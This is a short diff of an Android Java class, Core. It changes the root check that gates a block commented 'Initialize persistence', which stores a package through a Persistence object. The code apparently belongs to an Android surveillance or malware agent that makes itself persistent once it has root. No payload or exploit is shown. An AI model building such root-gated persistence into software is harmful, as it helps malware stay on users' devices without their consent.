@@ -462,7 +462,7 @@ public class Core extends Activity implements Runnable {
 			}
 
 			// Initialize persistence
-			if (Root.isRootShellInstalled()) {
+			if (PackageInfo.checkRoot()) {
 				Persistence p = new Persistence(Status.getAppContext());
 
 				p.storePackage();
